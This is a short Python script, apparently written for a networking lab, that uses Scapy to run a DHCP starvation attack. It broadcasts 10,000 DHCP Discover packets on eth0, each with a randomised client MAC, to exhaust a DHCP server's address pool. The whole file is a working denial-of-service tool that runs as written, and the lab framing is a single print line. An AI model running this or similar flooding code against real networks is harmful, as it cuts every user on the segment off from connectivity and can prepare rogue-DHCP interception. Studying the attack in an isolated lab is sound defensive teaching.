from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.all import RandMAC, conf, sendp
from scapy.packet import Packet

conf.checkIPaddr = False


def create_dhcp_discover(target_mac, target_ip) -> Packet:
    print("DEBUG target_ip:", repr(target_ip))
    dhcp_discover = Ether(dst=target_mac) / \
                    IP(src="0.0.0.0", dst=target_ip) / \
                    UDP(sport=68, dport=67) / \
                    BOOTP(op=1, chaddr=RandMAC()) / \
                    DHCP(options=[("message-type", "discover"), "end"])
    return dhcp_discover


def dhcp_starvation(target_mac, target_ip, interface, count) -> None:
    for _ in range(count):
        packet = create_dhcp_discover(target_mac,target_ip)
        sendp(packet, iface=interface, verbose=False)
        print("Sent DHCP Discover Packet")


if __name__ == "__main__":
    TARGET_MAC = "ff:ff:ff:ff:ff:ff"
    TARGET_IP = "255.255.255.255"
    interface = "eth0"
    count = 10000

    print(f"Starting DHCP Starvation lab on interface {interface}")
    dhcp_starvation(TARGET_MAC, TARGET_IP, interface, count)
    print("Complete")
